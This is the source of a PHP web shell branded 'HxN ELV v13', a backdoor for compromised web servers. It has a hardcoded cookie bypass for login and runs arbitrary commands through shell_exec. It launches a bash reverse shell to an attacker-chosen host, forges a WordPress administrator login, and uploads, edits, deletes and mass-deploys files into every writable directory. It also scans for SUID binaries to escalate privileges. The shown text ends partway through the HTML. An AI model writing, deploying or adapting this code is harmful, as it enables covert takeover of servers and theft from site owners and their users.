<?php
@ob_start();
@ini_set('output_buffering',0);
@ini_set('display_errors',0);
@session_start();
@error_reporting(0);
@set_time_limit(0);
$status_msg='';

// === PHP 5.x COMPAT: password_verify polyfill ===
if(!function_exists('password_verify')){
    function password_verify($pass,$hash){
        $crypt = crypt($pass, $hash);
        return $crypt === $hash;
    }
    function password_hash($pass,$algo=1,$opts=array()){
        $salt = '$2y$10$'.substr(str_replace('+','.',base64_encode(sha1(uniqid(mt_rand(),true),true))),0,22);
        return crypt($pass,$salt);
    }
}
// ===============================================

if(!class_exists('ELV_Stream_Wrapper')){
class ELV_Stream_Wrapper{
private $pos=0,$data='';
public function stream_open($p,$m,$o,&$op){$this->data=isset($GLOBALS['_ELV_MEM_PAYLOAD'])?$GLOBALS['_ELV_MEM_PAYLOAD']:'';return true;}
public function stream_read($c){$r=substr($this->data,$this->pos,$c);$this->pos+=strlen($r);return $r;}
public function stream_eof(){return $this->pos>=strlen($this->data);}
public function stream_stat(){return array();}
public function url_stat($a,$b){return array();}
}}
if(!in_array('elvmem',stream_get_wrappers()))@stream_wrapper_register('elvmem','ELV_Stream_Wrapper');

// AUTH: Hanya cookie Greetings yang jadi akses
if(isset($_COOKIE['Greetings'])&&$_COOKIE['Greetings']==='HxNxELV'){$_SESSION['elv_logged_in']=true;}

$auth_hash='$2y$13$lMBH18SBb0/k0VLOnTD9C.KQO42bFKVCC20BNFGzToTjmpn55e4/G';
$already_logged=((isset($_SESSION['elv_logged_in'])&&$_SESSION['elv_logged_in']===true)||(isset($_COOKIE['Greetings'])&&$_COOKIE['Greetings']==='HxNxELV'));
$inner_bg="https://j.top4top.io/p_3778w2fza0.png";
if(isset($_GET['download'])){$f=$_GET['download'];if(file_exists($f)&&is_file($f)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($f).'"');header('Expires:0');header('Cache-Control: must-revalidate');header('Pragma: public');header('Content-Length: '.filesize($f));readfile($f);exit;}}
if(isset($_GET['logout'])){session_destroy();setcookie('Greetings','',time()-3600,"/");header("Location: ?");exit;}
if(isset($_POST['l_pass'])){if(password_verify($_POST['l_pass'],$auth_hash)){$_SESSION['elv_logged_in']=true;setcookie('Greetings','HxNxELV',time()+(86400*30),"/");header("Location: ?");exit;}else{$login_err="ACCESS DENIED SECURITY BREACH DETECTED";}}
$is_logged_in=false;
if((isset($_SESSION['elv_logged_in'])&&$_SESSION['elv_logged_in']===true)||(isset($_COOKIE['Greetings'])&&$_COOKIE['Greetings']==='HxNxELV')){$is_logged_in=true;if(!isset($_SESSION['elv_logged_in']))$_SESSION['elv_logged_in']=true;}
$bg_terminal_js="const c=document.getElementById('terminal-bg'),x=c.getContext('2d');c.width=innerWidth;c.height=innerHeight;const d=['root@HxNxELV:~# systemctl start neon-grid','root@HxNxELV:~# traceroute 192.168.7.77','root@HxNxELV:~# tail -f /var/log/cyberpunk.log','[ OK ] ELV mainframe connected.','[+] NEON GRID OVERDRIVE PROTOCOL CYAN ACTIVE','root@HxNxELV:~# netstat -tulpn | grep LISTEN','tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN','tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN','[*] Hacking the Gibson SUCCESS','[+] Payload deployed cyberdeck_override.sh','root@HxNxELV:~# id','uid=0(root) gid=0(root) groups=0(root)','root@HxNxELV:~# uname -a','Linux ELV-core 6.8.0-cyberdeck SMP','root@HxNxELV:~# ./exploit.sh','[!] NEON PURPLE OVERLOAD QUANTUM BREACH','[ CYAN ] quantum-tunnel established on eth0','[ PURPLE ] neural-interface synchronized','[ MAGENTA ] payload injection complete','[ GREEN ] access granted to sector-7g','[ RED ] firewall breach in progress','root@HxNxELV:~# cat /etc/neon.conf','NEON MODE cyberpunk GRID overdrive','root@HxNxELV:~# ./pwn','[+] Reverse shell connected','[ CYAN ] encrypted channel AES-256-GCM','[ PURPLE ] post-exploitation module loaded'],l=['#00e5ff','#8a2be2','#ff00ff','#00ff88','#ff1493','#ffd700','#ff6600','#ff0044'];let q=[];let m=Math.floor(c.height/22);let s=Math.floor(m/1.1);for(let i=0;i<s;i++)q.push({t:d[Math.floor(Math.random()*d.length)],c:l[Math.floor(Math.random()*l.length)]});function a(){if(q.length>m)q.shift();q.push({t:d[Math.floor(Math.random()*d.length)],c:l[Math.floor(Math.random()*l.length)]})}setInterval(function(){x.clearRect(0,0,c.width,c.height);x.font='bold 14px monospace';for(let i=0;i<q.length;i++){x.fillStyle=q[i].c;x.shadowBlur=18;x.shadowColor=q[i].c;x.fillText(q[i].t,15,30+(i*22));x.shadowBlur=0}if(Math.random()>0.3)a()},250);window.addEventListener('resize',function(){c.width=window.innerWidth;c.height=window.innerHeight;m=Math.floor(c.height/22);x.clearRect(0,0,c.width,c.height)});";
$host_for_ip=isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'localhost';
$server_ip=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:gethostbyname($host_for_ip);
$client_ip=isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'UNKNOWN_IP';
$os_info=php_uname('s').' '.php_uname('m');
$php_version=phpversion();
if(!$is_logged_in){ ?>
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>HxN ELV FM Cyberpunk Metrocity Night</title><style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#05081a,#0a0f2e,#0d1238,#05081a,#0a0520);color:#e0e0ff;font-family:'Share Tech Mono',monospace;display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 15% 25%,rgba(0,229,255,0.15) 0%,transparent 45%),radial-gradient(circle at 85% 20%,rgba(138,43,226,0.2) 0%,transparent 45%),radial-gradient(circle at 50% 80%,rgba(255,0,255,0.08) 0%,transparent 45%);pointer-events:none;z-index:0}
#terminal-bg{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:0;opacity:.75}
.scanline{position:fixed;top:0;left:0;width:100%;height:100%;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,229,255,0.008) 2px,rgba(0,229,255,0.008) 4px);pointer-events:none;z-index:1}
.cyber-frame{width:94%;max-width:780px;padding:5px;background:linear-gradient(135deg,#00e5ff,#8a2be2,#ff00ff,#33f0ff,#b066ff);background-size:400% 400%;animation:bp 5s ease-in-out infinite;border-radius:12px;box-shadow:0 0 60px rgba(0,229,255,0.25),0 0 100px rgba(138,43,226,0.15),0 0 40px rgba(255,0,255,0.1);position:relative;z-index:2}
@keyframes bp{0%{background-position:0% 50%}25%{background-position:50% 100%}50%{background-position:100% 50%}75%{background-position:50% 0%}100%{background-position:0% 50%}}
.inner-terminal{background:rgba(5,8,26,0.96);border-radius:9px;padding:40px 30px 45px;display:flex;flex-direction:column;align-items:center;border:1px solid rgba(0,229,255,0.08);box-shadow:inset 0 0 40px rgba(0,0,0,0.5)}
.logo-box{width:100%;text-align:center;margin:0 auto 12px;padding:5px}
.logo-box img{max-width:90%;height:auto;opacity:.92;filter:drop-shadow(0 0 20px rgba(0,229,255,0.3)) drop-shadow(0 0 40px rgba(138,43,226,0.2)) drop-shadow(0 0 60px rgba(255,0,255,0.1));transition:all .4s ease}
.logo-box img:hover{opacity:1;filter:drop-shadow(0 0 30px rgba(0,229,255,0.5)) drop-shadow(0 0 60px rgba(138,43,226,0.3)) drop-shadow(0 0 80px rgba(255,0,255,0.2));transform:scale(1.03)}
.credit-link{color:#00e5ff;font-size:14px;font-weight:700;text-shadow:0 0 8px rgba(0,229,255,0.5),0 0 16px rgba(0,229,255,0.2);margin-bottom:18px;letter-spacing:2px;text-decoration:none;transition:all .3s}
.credit-link:hover{color:#ff00ff;text-shadow:0 0 8px rgba(255,0,255,0.5),0 0 16px rgba(255,0,255,0.2)}
.term-output{font-size:13px;line-height:1.8;margin-bottom:18px;color:#e0e0ff;width:100%;min-height:120px}
#login-form{display:none;margin-top:10px;border-top:3px solid #00e5ff;padding-top:18px;animation:su .5s ease-out;width:100%}
@keyframes su{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
.input-group{display:flex;align-items:center;margin-bottom:15px;background:rgba(0,229,255,0.02);border:1px solid rgba(0,229,255,0.1);border-left:4px solid #00e5ff;padding:14px 16px;border-radius:5px}
.input-group:focus-within{background:rgba(0,229,255,0.04);border-color:#33f0ff;border-left:4px solid #8a2be2;box-shadow:0 0 20px rgba(0,229,255,0.1)}
.prompt{color:#00e5ff;margin-right:12px;font-weight:700;font-size:15px}
input{background:transparent;border:none;color:#e0e0ff;font-family:'Share Tech Mono',monospace;font-size:16px;width:100%;padding:4px;outline:none;letter-spacing:3px}
input::placeholder{color:rgba(0,229,255,0.08)}
button{width:100%;padding:16px;background:transparent;border:2px solid #8a2be2;color:#33f0ff;font-family:'Share Tech Mono',monospace;font-size:15px;cursor:pointer;transition:all .3s;text-transform:uppercase;letter-spacing:4px;font-weight:700;border-radius:5px}
button:hover{background:rgba(0,229,255,0.03);color:#fff;box-shadow:0 0 30px rgba(0,229,255,0.2);border-color:#33f0ff}
.term-error{color:#ff1493;font-weight:700;margin-bottom:15px;border:2px solid #ff1493;padding:12px;text-align:center;background:rgba(255,20,147,0.03);font-size:12px;text-transform:uppercase;letter-spacing:2px;border-radius:5px}
.cursor{display:inline-block;width:10px;height:18px;background:#00e5ff;animation:bl 1s step-end infinite;vertical-align:middle;margin-left:8px}
@keyframes bl{50%{opacity:0}}
@media(max-width:600px){.logo-box img{max-width:95%}.inner-terminal{padding:20px 16px 30px}.credit-link{font-size:12px}}
</style></head><body><canvas id="terminal-bg"></canvas><div class="scanline"></div><div class="cyber-frame"><div class="inner-terminal"><div class="logo-box"><img src="https://d.top4top.io/p_3839nayyc0.png" alt="ELV"></div><a href="https://t.me/HxNoname" target="_blank" class="credit-link">HxN | t.me/HxNoname</a><div class="term-output" id="term-text"></div><?php if(isset($login_err))echo '<div class="term-error">[!] '.$login_err.' [!]</div>';?><form id="login-form" method="POST"><div class="input-group"><span class="prompt">HxNxELV:~#</span><input type="password" name="l_pass" placeholder="ACCESS KEY" required autofocus></div><button type="submit">AUTHENTICATE TO NEON NIGHT</button></form></div></div><script>
<?php echo $bg_terminal_js; ?>
var t=document.getElementById("term-text"),f=document.getElementById("login-form"),e=<?php echo isset($login_err)?'true':'false'; ?>;
async function b(){if(e){t.innerHTML="<div><span style='color:#00e5ff'>[sys]</span> Auth token rejected.</div><div><span style='color:#ff1493'>[!] INITIATING DEFENSIVE PROTOCOL</span></div>";f.style.display="block";return}
var s=['<span style="color:#00e5ff">[*]</span> Connecting to MetroCity Night mainframe...','<span style="color:#00e5ff">[*]</span> Target resolved: <?php echo htmlspecialchars($server_ip); ?>','<span style="color:#00e5ff">[*]</span> Kernel: <?php echo htmlspecialchars($os_info); ?>','<span style="color:#8a2be2">[*]</span> Bypassing neon quantum encryption SUCCESS','<span style="color:#8a2be2">[*]</span> Mounting encrypted cyber-volumes...','<span style="color:#ff00ff">[+]</span> Neural interface synchronized.','<span style="color:#00ff88">[+]</span> Quantum tunnel established on eth0.','<span style="color:#ffd700">[!]</span> AUTHENTICATION REQUIRED<span class=cursor></span>'];
for(var i=0;i<s.length;i++){var r=document.createElement("div");r.style.marginBottom="6px";t.appendChild(r);r.innerHTML=s[i];await new Promise(r=>setTimeout(r,120))}f.style.display="block"}
window.onload=b;
</script></body></html>
<?php exit; }
if(!function_exists('safeName')){function safeName($n){return preg_replace('/[^a-zA-Z0-9_\-\.]/','',$n);}}
@ini_set('display_errors',0);@ini_set('safe_mode',0);@ini_set('disable_functions','none');
$logo_inner="https://d.top4top.io/p_3849t8jge0.png";
$elv_icon="https://e.top4top.io/p_3767wkybq0.png";
$shell_logo="https://d.top4top.io/p_3839nayyc0.png";
$base_shell=dirname(__FILE__);
$dir=(isset($_GET['d']))?realpath($_GET['d']):$base_shell;
if(!$dir||!is_dir($dir))$dir=$base_shell;
if(isset($_POST['launch_rev'])){$ip=$_POST['rev_ip'];$port=$_POST['rev_port'];@shell_exec("bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &");$status_msg="REVERSE CONNECTION DISPATCHED TO $ip:$port";}
if(isset($_GET['action'])&&$_GET['action']=='wp_bypass'){$p=$dir.'/wp-load.php';if(file_exists($p)){require_once($p);$u=get_users(array('role'=>'administrator','number'=>1));if(!empty($u)){$a=$u[0];wp_set_current_user($a->ID,$a->user_login);wp_set_auth_cookie($a->ID);do_action('wp_login',$a->user_login,$a);echo"<script>alert('[+] Target Compromised Login sukses sebagai Administrator: {$a->user_login}');window.location.href='".admin_url()."';</script>";exit;}else$status_msg="BYPASS FAILED No Admin Users found in Database.";}else$status_msg="BYPASS FAILED wp-load.php not found.";}
if(isset($_POST['copy_f'])){$_SESSION['copy_file']=$_POST['c_path'];$status_msg="[+] TACTICAL COPY [ ".basename($_POST['c_path'])." ] STORED IN MEMORY";}
if(isset($_POST['paste_f'])){if(isset($_SESSION['copy_file'])&&file_exists($_SESSION['copy_file'])){$s=$_SESSION['copy_file'];$d=$dir.'/'.basename($s);if(copy($s,$d)){$status_msg="[+] TACTICAL PASTE [ ".basename($_SESSION['copy_file'])." ] DEPLOYED";unset($_SESSION['copy_file']);}else$status_msg="FAILED COULD NOT DEPLOY FILE";}}
if(isset($_POST['save_f'])){if(@file_put_contents($_POST['f_path'],$_POST['f_cnt']))$status_msg="[+] OVERRIDE SUCCESS [ ".basename($_POST['f_path'])." ] SAVED";}
if(isset($_FILES['u_f'])){if(@move_uploaded_file($_FILES['u_f']['tmp_name'],$dir.'/'.$_FILES['u_f']['name']))$status_msg="[+] UPLOAD SUCCESS [ ".$_FILES['u_f']['name']." ] DEPLOYED";}
if(isset($_GET['del'])){$t=$_GET['del'];if(is_dir($t)?@rmdir($t):@unlink($t))$status_msg="[-] WIPE SUCCESS [ ".basename($t)." ] TERMINATED";}
if(isset($_POST['mk_f'])){if(@file_put_contents($dir.'/'.$_POST['f_n'],""))$status_msg="[+] FILE CREATED [ ".$_POST['f_n']." ]";}
if(isset($_POST['mk_d'])){$s=safeName($_POST['d_n']);if(@mkdir($dir.'/'.$s))$status_msg="[+] DIR CREATED [ ".$s." ]";}
if(isset($_POST['rename'])){if(@rename($_POST['old'],$dir.'/'.$_POST['new']))$status_msg="[+] RENAME SUCCESS [ ".basename($_POST['old'])." ] TO [ ".basename($_POST['new'])." ]";}
if(isset($_POST['unzip_f'])){$z=$_POST['c_path'];$zip=new ZipArchive;if($zip->open($z)===TRUE){$zip->extractTo($dir);$zip->close();$status_msg="[+] UNZIP SUCCESS [ ".basename($z)." ] EXTRACTED";echo"<script>setTimeout(function(){window.location='?d=".urlencode($dir)."';},1000);</script>";}else$status_msg="[-] FAILED TO UNZIP [ ".basename($z)." ]";}
if(isset($_POST['ch_mod'])){if(@chmod($_POST['c_path'],octdec($_POST['c_perm'])))$status_msg="[+] CHMOD SUCCESS [ ".basename($_POST['c_path'])." ] TO [ ".$_POST['c_perm']." ]";}
if(isset($_POST['mass_deploy'])){$tr=$_POST['target_root'];$fn=safeName($_POST['mass_name']);$c=$_POST['mass_content'];$cnt=0;$it=array();if(is_dir($tr)){$d=@scandir($tr);if($d){foreach($d as $f){$p=$tr.'/'.$f;if($f!='.'&&$f!='..'&&is_dir($p)&&is_writable($p)){if(@file_put_contents($p.'/'.$fn,$c)){$cnt++;$it[]="[+] ".$f." -> ".$fn;}}}}$status_msg="MASS DEPLOY $cnt SECTORS INJECTED";if($cnt>0){$rt=implode("\n",$it);$status_msg.="<br><b>RESULT:</b><br><textarea style='width:100%;height:200px;background:#05081a;color:#00e5ff;border:1px solid #8a2be2;font-family:monospace;padding:10px' readonly>".htmlspecialchars($rt)."</textarea>";}else$status_msg.="<br>NO WRITABLE SECTORS";}else$status_msg="ERROR TARGET ROOT NOT FOUND";}
if(isset($_POST['create_symlink'])){$tp=$_POST['symlink_target'];$ln=safeName($_POST['symlink_name']);$lp=$dir.'/'.$ln;if(!empty($tp)&&!empty($ln)){if(!file_exists($lp)){if(@symlink($tp,$lp))$status_msg="[+] SYMLINK [ ".$ln." ] -> [ ".$tp." ]";else$status_msg="[-] FAILED SYMLINK";}else$status_msg="[-] SYMLINK NAME EXISTS";}}
$u_info=@get_current_user();if(function_exists('posix_getpwuid')){$uid=@posix_getpwuid(@posix_geteuid());if($uid)$u_info=$uid['name']." (".$uid['uid'].")";}
$s_soft=isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'UNKNOWN';
$s_ip=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'UNKNOWN';
$php_v=phpversion();$kernel=php_uname('r');
$uuid_raw=@file_get_contents('/etc/machine-id');$uuid=$uuid_raw?substr(trim($uuid_raw),0,18).'...':'LOCKED';
$dis_func_raw=@ini_get('disable_functions');$dis_func=$dis_func_raw?$dis_func_raw:'NONE BYPASSED';
$out="";
if(isset($_GET['autoroot'])&&$_GET['autoroot']=='exec'){$out="[[ ELV AUTO ROOT v1.0 ]]\n";$out.="[*] SYSTEM: ".php_uname()."\n";$suids=shell_exec("find / -perm -4000 -type f 2>/dev/null | head -n 10");$out.=$suids?:"[-] No SUID found.\n";}
if(isset($_POST['cmd'])){@chdir($dir);$out=@shell_exec($_POST['cmd']." 2>&1");}
function formatSize($b){if($b>=1048576)return number_format($b/1048576,2).' MB';if($b>=1024)return number_format($b/1024,2).' KB';return $b.' B';}
?>
<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>HxN ELV v13</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"/><link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/theme/dracula.min.css"><style>
:root{--c:#00e5ff;--c2:#33f0ff;--p:#8a2be2;--p2:#b066ff;--m:#ff00ff;--g:#00ff88;--y:#ffd700;--r:#ff1493;--o:#ff6600;--b:#05081a;--b2:#0a0f2e;--b3:#0d1238;--t:#e0e0ff;--t2:#b8b8d4;--t3:#6a6a9a}
*{box-sizing:border-box}body{background:var(--b);color:var(--t);font-family:'Share Tech Mono',monospace;margin:0;padding:16px;font-size:14px}
#terminal-bg{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:0;opacity:.65;pointer-events:none}
.wrap{background:var(--b2);border:1px solid rgba(0,229,255,0.08);padding:24px;box-shadow:0 0 80px rgba(0,229,255,0.06),0 0 60px rgba(138,43,226,0.08);border-radius:10px;max-width:1440px;margin:0 auto;position:relative;z-index:2}
.hd{display:flex;align-items:center;padding:15px 20px;margin-bottom:14px;justify-content:space-between;border-bottom:3px solid;border-image:linear-gradient(90deg,var(--c),var(--p),var(--m),var(--c2))1;background:rgba(0,229,255,0.02);border-radius:6px 6px 0 0}
.hl{display:flex;align-items:center;gap:12px}
.blc{width:70px;height:70px;border:3px solid var(--c);border-radius:50%;box-shadow:0 0 12px var(--c),0 0 24px var(--p);background:transparent;display:flex;align-items:center;justify-content:center;overflow:hidden;padding:3px;flex-shrink:0}
.blc img{width:100%;height:100%;object-fit:contain;filter:brightness(1.2) drop-shadow(0 0 6px rgba(0,229,255,0.3));background:transparent}
.ht{color:var(--c);font-size:14px;font-weight:700;text-shadow:0 0 5px var(--c),0 0 10px rgba(0,229,255,0.1);letter-spacing:2px}
.hs{margin-top:2px}
/* INNER LOGO DIPERBESAR */
.hs img{height:80px;filter:drop-shadow(0 0 20px rgba(0,229,255,0.5)) drop-shadow(0 0 40px rgba(138,43,226,0.3));display:block}
.blt{color:var(--r);text-decoration:none;font-weight:700;padding:10px 18px;border:2px solid var(--r);border-radius:5px;font-size:12px;transition:all .3s}
.blt:hover{box-shadow:0 0 20px rgba(255,20,147,0.25);transform:scale(1.05)}
.hg{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:8px;background:rgba(0,229,255,0.02);border:1px solid rgba(0,229,255,0.06);padding:12px;border-radius:6px;margin-bottom:14px}
.hi{background:rgba(0,229,255,0.02);padding:8px;border:1px solid rgba(138,43,226,0.1);border-radius:4px;text-align:center;font-size:11px;color:var(--t2);transition:border-color .3s}
.hi:hover{border-color:var(--c);box-shadow:0 0 8px var(--c)}
.hi b{color:var(--c2);display:block;margin-bottom:3px;font-size:11px;letter-spacing:1px}
.nd{height:3px;margin:14px 0;border-radius:2px;background:linear-gradient(90deg,var(--c),var(--p),var(--m),var(--c2));background-size:300% 100%;animation:df 4s linear infinite;box-shadow:0 0 20px rgba(0,229,255,0.2),0 0 20px rgba(138,43,226,0.2)}
@keyframes df{0%{background-position:0% 50%}100%{background-position:300% 50%}}
.nd2{height:1px;margin:10px 0;background:linear-gradient(90deg,transparent,var(--c),transparent);opacity:.5}
.ns{color:var(--g);border:1px solid var(--g);background:rgba(0,255,136,0.04);padding:12px;margin:12px 0;border-radius:5px;font-weight:700}
.nav{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;gap:10px}
.nav a{color:var(--c);font-size:42px;text-decoration:none;padding:14px 24px;border:2px solid rgba(0,229,255,0.12);border-radius:8px;transition:all .3s;display:flex;flex-direction:column;align-items:center;flex:1;background:rgba(0,229,255,0.01);animation:navglow 4s linear infinite}
@keyframes navglow{0%{border-color:var(--c);box-shadow:0 0 10px var(--c)}25%{border-color:var(--p);box-shadow:0 0 10px var(--p)}50%{border-color:var(--m);box-shadow:0 0 10px var(--m)}75%{border-color:var(--c2);box-shadow:0 0 10px var(--c2)}100%{border-color:var(--c);box-shadow:0 0 10px var(--c)}}
.nav a:hover{transform:scale(1.06);background:rgba(0,229,255,0.03);border-color:var(--m)!important;box-shadow:0 0 30px var(--m)!important;animation:none}
.nav a span{font-size:12px;margin-top:6px;text-transform:uppercase;color:var(--t2);letter-spacing:2px;font-weight:700}
.nav .ascii-btn pre{margin:0;font-size:6px;line-height:1.2;font-weight:700;color:var(--c);text-shadow:0 0 5px var(--c)}
.nav .ascii-btn div{font-size:9px;font-weight:700;letter-spacing:3px;margin-top:5px;color:var(--m);text-shadow:0 0 8px var(--m)}
.tg{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-bottom:14px}
.tc{background:rgba(0,229,255,0.02);border:1px solid rgba(138,43,226,0.08);border-radius:6px;padding:12px;text-decoration:none;text-align:center;transition:all .3s;color:var(--t)}
.tc:hover{border-color:var(--c);box-shadow:0 0 15px var(--c);transform:translateY(-3px)}
.tc i{font-size:24px;color:var(--p);margin-bottom:8px}
.tc h3{margin:0;font-size:12px;color:var(--c2)}
.tc p{margin:5px 0 0;font-size:10px;color:var(--t2)}
.bc{display:flex;align-items:center;background:rgba(0,229,255,0.02);padding:10px 14px;margin-bottom:14px;border-left:4px solid var(--c);overflow-x:auto;white-space:nowrap;border-radius:5px;font-size:13px;border:1px solid rgba(0,229,255,0.05)}
.bc a{color:var(--t);text-decoration:none;font-weight:700}
.bc a:hover{color:var(--c);text-shadow:0 0 6px var(--c)}
.tools{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:14px}
.tb{border:1px solid rgba(0,229,255,0.08);background:rgba(0,229,255,0.02);border-radius:6px;padding:10px;display:flex;flex-direction:column;justify-content:center}
.tb:hover{border-color:var(--c);box-shadow:0 0 8px var(--c)}
.bcg{background:transparent;border:2px solid var(--p2);color:var(--p2);font-weight:700;border-radius:4px;cursor:pointer;font-family:inherit;font-size:10px;padding:8px 12px;transition:all .3s}
.bcg:hover{border-color:var(--c);box-shadow:0 0 15px var(--c),0 0 30px var(--m);color:#fff}
input[type="text"],input[type="number"],textarea,select{background:var(--b);border:1px solid rgba(0,229,255,0.1);color:var(--t);padding:8px;width:100%;outline:none;border-radius:4px;font-size:12px;font-family:inherit}
input:focus,textarea:focus{border-color:var(--c);box-shadow:0 0 10px rgba(0,229,255,0.12)}
table{width:100%;border-collapse:collapse;min-width:600px;font-size:13px}
th{text-align:left;background:rgba(0,229,255,0.03);color:var(--c2);padding:10px 12px;font-size:11px;letter-spacing:1px;border-bottom:2px solid rgba(0,229,255,0.1)}
td{padding:8px 12px;border-bottom:1px solid rgba(0,229,255,0.02);color:var(--t)}
.itt{text-decoration:none;font-weight:700;font-size:14px;transition:color .2s}
.itt[w="1"]{color:var(--g)!important;text-shadow:0 0 5px var(--g)}.itt[w="0"]{color:var(--r)!important;text-shadow:0 0 5px var(--r)}
.itt:hover{color:var(--c)!important;text-shadow:0 0 8px var(--c)}
.bas{background:transparent;border:none;color:var(--t2);cursor:pointer;padding:3px;font-size:13px;margin:0 2px;transition:.2s}
.bas:hover{transform:scale(1.2)}
.console{background:rgba(0,229,255,0.02);color:var(--g);padding:16px;border:1px solid rgba(0,229,255,0.08);font-size:12px;min-height:80px;overflow-y:auto;margin-bottom:10px;border-top:3px solid var(--c);white-space:pre-wrap;border-radius:5px;font-family:inherit;text-shadow:0 0 5px var(--g)}
.console pre{color:var(--g);margin:0;font-size:12px}
.tr{background:rgba(0,229,255,0.01);border:1px solid rgba(138,43,226,0.08);border-radius:6px;overflow-x:auto}
.ft{text-align:center;margin-top:24px;padding-bottom:16px;color:var(--t3);font-size:10px}
.CodeMirror{height:auto;min-height:350px;font-size:12px;border-radius:5px;border:1px solid rgba(138,43,226,0.1)}
.cm-s-dracula .CodeMirror-gutters{background:#21222c!important;border-right:1px solid #44475a!important}
.cm-s-dracula .CodeMirror-linenumber{color:#6272a4!important}
.cm-s-dracula .CodeMirror-cursor{border-left:2px solid #ff79c6!important}
.cm-s-dracula .CodeMirror-selected{background:rgba(255,121,198,0.15)!important}
.cm-s-dracula .CodeMirror-activeline-background{background:rgba(139,233,253,0.05)!important}
@media(max-width:600px){.tools{grid-template-columns:1fr}.hg{grid-template-columns:repeat(2,1fr)}.wrap{padding:12px}.nav a{font-size:28px;padding:10px 14px}.blc{width:55px;height:55px}.hs img{height:60px}}
</style></head><body><canvas id="terminal-bg"></canvas><div class="wrap">
<div class="hd"><div class="hl"><div class="blc"><img src="<?php echo $logo_inner; ?>" alt="ELV"></div><div><div class="hs"><img src="https://d.top4top.io/p_3839nayyc0.png" alt="L"></div><div class="ht" style="margin-top:4px">HxN | t.me/HxNoname</div></div></div><a href="?logout=1" class="blt">LOGOUT [X]</a></div>
<div class="nd"></div>
<div class="hg">
<div class="hi"><b>USER</b><?php echo htmlspecialchars($u_info); ?></div>
<div class="hi"><b>SERVER</b><?php echo htmlspecialchars(substr($s_soft,0,25)); ?></div>
<div class="hi"><b>IP</b><?php echo htmlspecialchars($s_ip); ?></div>
<div class="hi"><b>PHP</b><?php echo htmlspecialchars($php_v); ?></div>
<div class="hi"><b>KERNEL</b><?php echo htmlspecialchars(substr($kernel,0,25)); ?></div>
<div class="hi"><b>UUID</b><?php echo htmlspecialchars($uuid); ?></div>
<div class="hi"><b>DOCROOT</b><?php echo htmlspecialchars(substr($_SERVER['DOCUMENT_ROOT'],0,30)); ?></div>
<div class="hi"><b>DISABLED</b><?php echo htmlspecialchars(substr($dis_func,0,20)); ?></div>
</div>
<?php if($status_msg){echo '<div class="ns">'.$status_msg.'</div><script>setTimeout(function(){var n=document.querySelector(".ns");if(n)n.style.display="none"},6000)</script>';} ?>
<div class="nav">
<a href="?d=<?php echo urlencode($dir); ?>"><i class="fa-regular fa-folder-open"></i><span>FILE</span></a>
<a href="?d=<?php echo urlencode($dir); ?>&mode=elv_tools" class="ascii-btn"><pre>███████╗░░░██╗░░░░░░░░██╗░░░██╗
██╔════╝░░░██║░░░░░░░░██║░░░██║
█████╗░░░░░██║░░░░░░░░╚██╗░██╔╝
██╔══╝░░░░░██║░░░░░░░░░╚████╔╝░
███████╗██╗███████╗██╗░░╚██╔╝░░
╚══════╝╚═╝╚══════╝╚═╝░░░╚═╝░░░</pre><div>ENGINE</div></a>
<a href="?d=<?php echo urlencode($dir); ?>&mode=terminal"><i class="fa-solid fa-terminal"></i><span>TERMINAL</span></a>
</div>
<div class="nd2"></div>

<?php if(@$_GET['mode']=='elv_tools'){ ?>
<div><h2 style="color:var(--c2);text-align:center;text-shadow:0 0 8px var(--c);margin:0 0 16px">[ ELV ENGINE v13.0 // NEON NIGHT ]</h2><div class="nd2"></div><div class="tg">
<a href="?d=<?php echo urlencode($dir); ?>&autoroot=1" class="tc" style="border-left:3px solid var(--p)"><i class="fa-solid fa-bolt"></i><h3>AUTO ROOT EXPLOIT</h3><p>SUID privilege escalation scan</p></a>
<a href="?d=<?php echo urlencode($dir); ?>&semiauto=1" class="tc" style="border-left:3px solid var(--c)"><i class="fa-solid fa-radar"></i><h3>SEMI AUTO RECON</h3><p>Writable dirs & sensitive files</p></a>
<a href="?d=<?php echo urlencode($dir); ?>&wpbypass=1" class="tc" style="border-left:3px solid var(--g)"><i class="fa-brands fa-wordpress"></i><h3>WP ADMIN BYPASS</h3><p>WordPress admin access</p></a>
<a href="?d=<?php echo urlencode($dir); ?>&revshell=1" class="tc" style="border-left:3px solid var(--m)"><i class="fa-solid fa-network-wired"></i><h3>REVERSE SHELL</h3><p>Backdoor connection</p></a>
